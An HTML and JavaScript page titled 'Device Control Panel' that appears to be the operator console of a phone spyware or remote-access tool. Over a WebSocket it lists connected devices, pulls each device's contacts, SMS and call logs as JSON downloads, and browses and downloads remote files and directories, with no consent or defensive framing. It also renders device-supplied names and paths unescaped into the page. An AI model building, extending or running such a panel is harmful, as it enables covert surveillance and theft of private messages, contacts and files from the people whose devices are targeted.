<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Device Control Panel</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f4f4f4;
      padding: 2rem;
    }
    h1, h2 {
      color: #333;
    }
    .device {
      background: white;
      padding: 1rem;
      margin: 0.5rem 0;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .online { color: green; font-weight: bold; }
    .offline { color: red; font-weight: bold; }
    .btn {
      padding: 0.4rem 0.8rem;
      margin: 0.2rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .btn:disabled {
      background: #cccccc;
      cursor: not-allowed;
    }
    .file-explorer {
      background: white;
      padding: 1rem;
      margin-top: 1rem;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      display: none;
    }
    .file-explorer-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .file-explorer-path {
      font-weight: bold;
      margin-bottom: 0.5rem;
      word-break: break-all;
    }
    .file-explorer-breadcrumb {
      background: #f8f9fa;
      padding: 0.5rem;
      border-radius: 4px;
      margin-bottom: 1rem;
    }
    .file-item {
      display: flex;
      align-items: center;
      padding: 0.5rem;
      border-bottom: 1px solid #eee;
      cursor: pointer;
    }
    .file-item:hover {
      background: #f8f9fa;
    }
    .file-item-icon {
      margin-right: 0.5rem;
      font-size: 1.2rem;
    }
    .file-item-name {
      flex-grow: 1;
    }
    .file-item-details {
      color: #666;
      font-size: 0.8rem;
    }
    .file-item-actions {
      display: flex;
      gap: 0.5rem;
    }
    .directory-icon {
      color: #ffc107;
    }
    .file-icon {
      color: #6c757d;
    }
    .loading {
      text-align: center;
      padding: 1rem;
      color: #666;
    }
    .downloads {
      background: white;
      padding: 1rem;
      margin-top: 1rem;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .download-item {
      display: flex;
      align-items: center;
      padding: 0.5rem;
      border-bottom: 1px solid #eee;
      margin-bottom: 0.5rem;
    }
    .download-info {
      flex-grow: 1;
    }
    .download-progress {
      background: #e9ecef;
      height: 10px;
      border-radius: 5px;
      margin: 0.5rem 0;
      overflow: hidden;
    }
    .download-progress-bar {
      background: #007bff;
      height: 100%;
      transition: width 0.3s;
    }
    .download-actions {
      display: flex;
      gap: 0.5rem;
    }
    .download-status {
      font-size: 0.8rem;
      color: #666;
    }
    .download-status.complete {
      color: green;
    }
    .download-status.error {
      color: red;
    }
  </style>
</head>
<body>
  <h1>Connected Devices</h1>
  <div id="deviceList">Loading...</div>

  <div id="downloads" class="downloads">
    <h2>File Downloads</h2>
    <div id="downloadsList">
      <p>No active downloads</p>
    </div>
  </div>

  <div id="fileExplorer" class="file-explorer">
    <div class="file-explorer-header">
      <h2>File Explorer</h2>
      <button class="btn" id="closeExplorer">Close</button>
    </div>
    <div class="file-explorer-breadcrumb">
      <div class="file-explorer-path" id="currentPath">Loading...</div>
    </div>
    <div id="fileList">
      <div class="loading">Loading...</div>
    </div>
  </div>

  <script>
    let currentDeviceId = null;
    let currentPath = "/";
    const socket = new WebSocket(`ws://${location.host}`);
    
    // Track downloads
    const downloads = new Map();

    socket.addEventListener('open', () => {
      console.log('Connected to backend');
      socket.send(JSON.stringify({ type: 'panelConnect' }));
    });

    socket.addEventListener('message', (event) => {
      const message = JSON.parse(event.data);

      if (message.type === 'deviceList') {
        const container = document.getElementById('deviceList');
        container.innerHTML = '';

        if (message.data.length === 0) {
          container.innerHTML = '<p>No devices connected</p>';
          return;
        }

        message.data.forEach((device) => {
          const el = document.createElement('div');
          el.className = 'device';
          el.innerHTML = `
            <div><strong>ID:</strong> ${device.id}</div>
            <div><strong>Status:</strong> <span class="${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></div>
            <div><strong>Last Seen:</strong> ${device.lastSeen}</div>
            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Download Contacts</button>
            <button class="btn" onclick="requestData('${device.id}', 'sms')">Download SMS</button>
            <button class="btn" onclick="requestData('${device.id}', 'calls')">Download Call Logs</button>
            <button class="btn" onclick="openFileExplorer('${device.id}')" ${!device.online ? 'disabled' : ''}>File Explorer</button>
          `;
          container.appendChild(el);
        });
      }

      if (message.type === 'dataResponse') {
        const { deviceId, dataType, payload } = message;
        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `${deviceId}-${dataType}.json`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
      }

      if (message.type === 'fileExplorerResponse') {
        const { deviceId, action, path, items, error } = message;

        // Only process if this is for the current device
        if (deviceId !== currentDeviceId) return;

        if (error) {
          alert(`Error: ${error}`);
          return;
        }

        // Update current path
        currentPath = path;
        document.getElementById('currentPath').textContent = currentPath;

        // Render file list
        const fileList = document.getElementById('fileList');
        fileList.innerHTML = '';

        if (items && items.length > 0) {
          items.forEach(item => {
            const fileItem = document.createElement('div');
            fileItem.className = 'file-item';

            if (item.type === 'directory') {
              fileItem.innerHTML = `
                <div class="file-item-icon directory-icon">üìÅ</div>
                <div class="file-item-name">${item.name}</div>
                <div class="file-item-details">${formatDate(item.lastModified)}</div>
                <div class="file-item-actions">
                  <button class="btn" onclick="downloadItem('${item.path}', 'directory'); event.stopPropagation();">Download</button>
                </div>
              `;
              fileItem.onclick = () => navigateTo(item.path);
            } else {
              fileItem.innerHTML = `
                <div class="file-item-icon file-icon">üìÑ</div>
                <div class="file-item-name">${item.name}</div>
                <div class="file-item-details">${formatFileSize(item.size)} - ${formatDate(item.lastModified)}</div>
                <div class="file-item-actions">
                  <button class="btn" onclick="downloadItem('${item.path}', 'file'); event.stopPropagation();">Download</button>
                </div>
              `;
            }

            fileList.appendChild(fileItem);
          });
        } else {
          fileList.innerHTML = '<div class="loading">No files found</div>';
        }
      }
      
      // Handle download related messages
      if (message.type === 'fileDownloadStarted') {
        const { requestId, deviceId, path, downloadType } = message;
        const fileName = path.split('/').pop();
        
        // Add to downloads list
        downloads.set(requestId, {
          deviceId,
          path,
          fileName,
          downloadType,
          status: 'pending',
          progress: 0
        });
        
        updateDownloadsList();
      }
      
      if (message.type === 'fileDownloadProgress') {
        const { requestId, progress, bytesTransferred, totalBytes, transferId, currentFile } = message;
        
        // Update download progress
        const download = downloads.get(requestId);
        if (download) {
          download.progress = progress;
          download.bytesTransferred = bytesTransferred;
          download.totalBytes = totalBytes;
          download.status = 'downloading';
          download.transferId = transferId;
          download.currentFile = currentFile;
          
          updateDownloadsList();
        }
      }
      
      if (message.type === 'fileDownloadComplete') {
        const { requestId, path, name, size, transferId } = message;
        
        // Update download status
        const download = downloads.get(requestId);
        if (download) {
          download.progress = 100;
          download.status = 'complete';
          download.downloadPath = path;
          download.name = name;
          download.size = size;
          
          updateDownloadsList();
        }
      }
      
      if (message.type === 'fileDownloadError') {
        const { requestId, error } = message;
        
        // Update download status
        const download = downloads.get(requestId);
        if (download) {
          download.status = 'error';
          download.error = error;
          
          updateDownloadsList();
        }
      }
    });

    function requestData(deviceId, dataType) {
      socket.send(JSON.stringify({
        type: 'requestData',
        targetId: deviceId,
        dataType: dataType
      }));
    }
    
    function downloadItem(path, downloadType) {
      socket.send(JSON.stringify({
        type: 'fileDownload',
        targetId: currentDeviceId,
        path: path,
        downloadType: downloadType
      }));
      
      alert(`Download of ${downloadType} started: ${path}`);
    }
    
    function updateDownloadsList() {
      const container = document.getElementById('downloadsList');
      
      if (downloads.size === 0) {
        container.innerHTML = '<p>No active downloads</p>';
        return;
      }
      
      container.innerHTML = '';
      
      // Sort downloads by status (active first, then completed, then errors)
      const sortedDownloads = Array.from(downloads.entries()).sort((a, b) => {
        const statusOrder = { 'downloading': 0, 'pending': 1, 'complete': 2, 'error': 3 };
        return statusOrder[a[1].status] - statusOrder[b[1].status];
      });
      
      sortedDownloads.forEach(([requestId, download]) => {
        const el = document.createElement('div');
        el.className = 'download-item';
        
        let statusText = '';
        let statusClass = '';
        
        switch (download.status) {
          case 'pending':
            statusText = 'Waiting for device to respond...';
            break;
          case 'downloading':
            const bytesText = download.bytesTransferred && download.totalBytes ? 
              `${formatFileSize(download.bytesTransferred)} / ${formatFileSize(download.totalBytes)}` : '';
            statusText = `Downloading${download.currentFile ? ` (${download.currentFile})` : ''} - ${bytesText}`;
            break;
          case 'complete':
            statusText = 'Download complete';
            statusClass = 'complete';
            break;
          case 'error':
            statusText = `Error: ${download.error || 'Unknown error'}`;
            statusClass = 'error';
            break;
        }
        
        el.innerHTML = `
          <div class="download-info">
            <div><strong>${download.fileName || download.name || 'Unknown'}</strong> (${download.downloadType})</div>
            <div class="download-progress">
              <div class="download-progress-bar" style="width: ${download.progress || 0}%"></div>
            </div>
            <div class="download-status ${statusClass}">${statusText}</div>
          </div>
          <div class="download-actions">
            ${download.status === 'complete' ? 
              `<a class="btn" href="${download.downloadPath}" target="_blank">Open</a>` : ''}
            <button class="btn" onclick="removeDownload('${requestId}')">Remove</button>
          </div>
        `;
        
        container.appendChild(el);
      });
    }
    
    function removeDownload(requestId) {
      downloads.delete(requestId);
      updateDownloadsList();
    }

    function openFileExplorer(deviceId) {
      currentDeviceId = deviceId;
      document.getElementById('fileExplorer').style.display = 'block';

      // Request root directory listing
      socket.send(JSON.stringify({
        type: 'fileExplorer',
        targetId: deviceId,
        action: 'listRoot',
        path: '/'
      }));

      currentPath = '/';
      document.getElementById('currentPath').textContent = 'Loading...';
      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
    }

    function navigateTo(path) {
      socket.send(JSON.stringify({
        type: 'fileExplorer',
        targetId: currentDeviceId,
        action: 'listDirectory',
        path: path
      }));

      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
    }

    function formatFileSize(bytes) {
      if (!bytes && bytes !== 0) return 'Unknown size';
      if (bytes === 0) return '0 Bytes';
      const k = 1024;
      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
      const i = Math.floor(Math.log(bytes) / Math.log(k));
      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    function formatDate(timestamp) {
      if (!timestamp) return 'Unknown date';
      return new Date(timestamp).toLocaleString();
    }

    // Close explorer button
    document.getElementById('closeExplorer').addEventListener('click', () => {
      document.getElementById('fileExplorer').style.display = 'none';
      currentDeviceId = null;
    });
  </script>
</body>
</html>